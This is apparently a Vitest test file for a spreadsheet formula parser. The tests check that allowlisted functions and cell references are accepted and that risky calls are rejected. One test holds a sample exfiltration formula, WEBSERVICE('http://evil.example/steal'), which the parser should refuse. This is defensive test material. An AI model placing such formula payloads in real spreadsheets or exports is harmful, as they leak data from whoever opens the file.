import { describe, expect, it } from "vitest";
import { isFormulaCell, parseFormula, stripFormulaEscape } from "../src/formula.js";

describe("isFormulaCell", () => {
  it("is true for content starting with =", () => {
    expect(isFormulaCell("=SUM(A1:A2)")).toBe(true);
  });

  it("is false for plain text, including text starting with + or -", () => {
    expect(isFormulaCell("120000")).toBe(false);
    expect(isFormulaCell("+1500")).toBe(false);
    expect(isFormulaCell("-1500")).toBe(false);
  });
});

describe("stripFormulaEscape", () => {
  it("strips a leading backslash before =", () => {
    expect(stripFormulaEscape("\\=literal")).toBe("=literal");
  });

  it("leaves other content untouched", () => {
    expect(stripFormulaEscape("plain text")).toBe("plain text");
  });
});

describe("parseFormula", () => {
  it("accepts arithmetic and cell references", () => {
    const result = parseFormula("B2/C2-1");
    expect(result.ok).toBe(true);
    if (result.ok) expect(result.refs).toEqual(expect.arrayContaining(["B2", "C2"]));
  });

  it("accepts an allowlisted function call and reports it", () => {
    const result = parseFormula("SUM(B2:B4)");
    expect(result.ok).toBe(true);
    if (result.ok) {
      expect(result.functions).toEqual(["SUM"]);
      expect(result.refs).toEqual(["B2:B4"]);
    }
  });

  it("accepts nested allowlisted function calls and cross-sheet references", () => {
    const result = parseFormula('IF(Revenue!A1>0, AVERAGE(B2:B4), 0)');
    expect(result.ok).toBe(true);
    if (result.ok) expect(result.functions.sort()).toEqual(["AVERAGE", "IF"]);
  });

  it("accepts string literals, including escaped quotes", () => {
    const result = parseFormula('IF(A1="ok""ish", 1, 0)');
    expect(result.ok).toBe(true);
  });

  it("accepts TRUE/FALSE boolean literals", () => {
    expect(parseFormula("IF(TRUE, 1, 0)").ok).toBe(true);
  });

  it("rejects a disallowed function even if it looks like a normal call", () => {
    const result = parseFormula('WEBSERVICE("http://evil.example/steal")');
    expect(result.ok).toBe(false);
    if (!result.ok) expect(result.error).toContain("WEBSERVICE");
  });

  it("rejects RTD and HYPERLINK the same way (allowlist-based, not a denylist)", () => {
    expect(parseFormula("RTD(1,2,3)").ok).toBe(false);
    expect(parseFormula('HYPERLINK("http://example.com")').ok).toBe(false);
  });

  it("rejects external workbook references", () => {
    const result = parseFormula("[Book1.xlsx]Sheet1!A1");
    expect(result.ok).toBe(false);
  });

  it("rejects a bare unrecognized name", () => {
    const result = parseFormula("SOME_MACRO");
    expect(result.ok).toBe(false);
  });

  it("rejects an unterminated string literal", () => {
    expect(parseFormula('"unterminated').ok).toBe(false);
  });
});
